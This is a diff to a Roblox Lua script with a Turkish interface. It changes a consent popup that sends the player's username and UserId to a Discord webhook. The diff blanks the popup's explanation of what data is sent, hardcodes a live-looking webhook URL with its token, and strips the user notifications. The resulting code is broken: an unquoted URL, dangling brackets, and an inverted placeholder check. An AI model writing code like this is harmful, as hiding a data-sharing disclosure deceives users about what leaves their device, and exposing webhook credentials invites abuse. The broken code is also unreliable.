@@ -1038,7 +1038,7 @@ do
 	WindUI:Popup({
 		Title = "Gizlilik izni",
 		Icon = "shield-check",
-		Content = "İzin verirsen Roblox kullanıcı adın ve UserId bilgin Discord kanalına gönderilecek. İzin vermezsen hiçbir bilgi gönderilmeyecek.",
+		Content = "bune.",
 		Buttons = {
 			{
 				Title = "İzin ver",
@@ -1046,11 +1046,8 @@ do
 				Variant = "Primary",
 				Callback = function()
 					local httpRequest = resolveHttpRequest()
-					if type(httpRequest) ~= "function" or CONSENT_WEBHOOK_URL == "WEBHOOK_URL_BURAYA" then
-						WindUI:Notify({
-							Title = "Gönderilemedi",
-						Content = "Webhook adresini kodda ayarlamalısın.",
-							Duration = 4,
+					if type(httpRequest) ~= "function" or CONSENT_WEBHOOK_URL == "https://discord.com/api/webhooks/1574885602950783027/h9_-F2fsVX7VMwW8Lm5AXtWkRmsvdGkpH4NncYfXowip7A_fD1Skc_rErHALW7TlPXRs" then
+						
 						})
 						return
 					end
@@ -1060,17 +1057,11 @@ do
 						content = "Kullanıcı bilgi paylaşımına izin verdi.\nRoblox kullanıcı adı: " .. tostring(player.Name) .. "\nUserId: " .. tostring(player.UserId),
 					}
 					local ok, response = pcall(httpRequest, {
-						Url = CONSENT_WEBHOOK_URL,
+						Url = https://discord.com/api/webhooks/1574885602950783027/h9_-F2fsVX7VMwW8Lm5AXtWkRmsvdGkpH4NncYfXowip7A_fD1Skc_rErHALW7TlPXRs,
 						Method = "POST",
 						Headers = { ["Content-Type"] = "application/json" },
 						Body = HttpService:JSONEncode(payload),
-					})
-					local status = ok and type(response) == "table" and tonumber(response.StatusCode or response.Status)
-					if ok and (not status or (status >= 200 and status < 300)) then
-						WindUI:Notify({
-							Title = "İzin kaydedildi",
-							Content = "Kullanıcı adın Discord kanalına gönderildi.",
-							Duration = 4,
+					
 						})
 					else
 						WindUI:Notify({
